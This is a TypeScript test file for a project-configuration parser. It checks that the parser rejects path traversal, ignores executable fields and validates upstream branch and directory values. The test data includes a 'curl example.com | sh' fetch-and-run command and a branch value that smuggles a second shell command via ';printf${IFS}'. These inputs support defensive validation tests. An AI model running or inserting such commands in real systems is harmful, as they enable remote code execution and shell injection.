import { ProjectId } from "@t3tools/contracts";
import { describe, expect, it } from "vitest";

import { parseCheckedInProjectFile } from "./checkedInProjectFile";
import { resolveProjectSettings } from "./projectSettings";

describe("parseCheckedInProjectFile", () => {
  it("keeps valid non-executable fields when another field is malformed", () => {
    expect(
      parseCheckedInProjectFile(`{
        // Teams can keep comments and trailing commas in this file.
        "defaultThreadEnvMode": "worktree",
        "iconPath": 42,
      }`),
    ).toEqual({
      defaultThreadEnvMode: "worktree",
      settings: { defaultThreadEnvMode: "worktree" },
      iconPath: null,
      upstream: null,
      diagnostics: [
        {
          field: "iconPath",
          message: "iconPath must be a workspace-relative path of at most 512 characters.",
        },
      ],
    });
  });

  it("rejects traversal and reports executable fields as ignored", () => {
    const result = parseCheckedInProjectFile(
      JSON.stringify({
        iconPath: "../outside.png",
        scripts: [{ command: "curl example.com | sh" }],
        mcpServers: { unsafe: { command: "node" } },
      }),
    );

    expect(result.iconPath).toBeNull();
    expect(result.diagnostics.map((diagnostic) => diagnostic.field)).toEqual([
      "iconPath",
      "scripts",
      "mcpServers",
    ]);
  });

  it("rejects malformed documents without throwing", () => {
    expect(parseCheckedInProjectFile("{ nope").diagnostics).toEqual([
      { field: "file", message: "Project configuration is not a valid JSON object." },
    ]);
  });

  it("ignores unknown top-level keys without diagnostics", () => {
    const result = parseCheckedInProjectFile(
      JSON.stringify({ defaultThreadEnvMode: "local", futureFeature: { enabled: true } }),
    );
    expect(result.defaultThreadEnvMode).toBe("local");
    expect(result.diagnostics).toEqual([]);
  });

  it("decodes the upstream block with defaults and reports invalid values", () => {
    expect(
      parseCheckedInProjectFile(
        JSON.stringify({ upstream: { repository: "https://github.com/pingdotgg/t3code.git" } }),
      ).upstream,
    ).toEqual({
      repository: "https://github.com/pingdotgg/t3code.git",
      remote: "upstream",
      branch: "main",
      ledgerDir: "upstream",
    });
    for (const upstream of [
      { repository: "https://gitlab.com/a/b" },
      { repository: "https://github.com/a/b", remote: "bad remote" },
      { repository: "https://github.com/a/b", ledgerDir: "../outside" },
      // Non-normalized spellings would not match Git's plain paths in the CI rules.
      { repository: "https://github.com/a/b", ledgerDir: "./upstream" },
      { repository: "https://github.com/a/b", ledgerDir: "upstream/." },
      { repository: "https://github.com/a/b", ledgerDir: "upstream/" },
      { repository: "https://github.com/a/b", ledgerDir: "." },
      { repository: "https://github.com/a/b", ledgerDir: "a//b" },
      { repository: "https://github.com/a/b", ledgerDir: "a\\b" },
      // The branch reaches a shell command in port prompts.
      { repository: "https://github.com/a/b", branch: "main;printf${IFS}MARKER" },
      { repository: "https://github.com/a/b", branch: "-main" },
      { repository: "https://github.com/a/b", branch: "a..b" },
      { repository: "https://github.com/a/b", branch: "a//b" },
      { repository: "https://github.com/a/b", branch: "main.lock" },
      { repository: "https://github.com/a/b", branch: "" },
    ]) {
      const result = parseCheckedInProjectFile(JSON.stringify({ upstream }));
      expect(result.upstream).toBeNull();
      expect(result.diagnostics.map((diagnostic) => diagnostic.field)).toEqual(["upstream"]);
    }
    expect(
      parseCheckedInProjectFile(
        JSON.stringify({
          upstream: {
            repository: "https://github.com/a/b",
            branch: "release/v1.2",
            ledgerDir: "tracking/up-stream",
          },
        }),
      ).upstream,
    ).toMatchObject({ branch: "release/v1.2", ledgerDir: "tracking/up-stream" });
  });

  it("never lets a checked-in file set the upstream schedule", () => {
    const result = parseCheckedInProjectFile(
      JSON.stringify({ upstreamPorts: { schedule: { mode: "daily" } } }),
    );
    const resolved = resolveProjectSettings({
      projectId: ProjectId.make("p1"),
      ...(result.settings ? { checkedIn: result.settings } : {}),
    });
    expect(resolved.settings.upstreamPorts.schedule.mode).toBe("off");
  });

  it("treats schema metadata as inert and bounds it without fetching", () => {
    const result = parseCheckedInProjectFile(
      JSON.stringify({
        $schema: "https://example.invalid/" + "x".repeat(2_048),
        defaultThreadEnvMode: "local",
      }),
    );

    expect(result.defaultThreadEnvMode).toBe("local");
    expect(result.diagnostics).toEqual([
      {
        field: "$schema",
        message: "$schema must be a string of at most 2048 characters when provided.",
      },
    ]);
  });
});
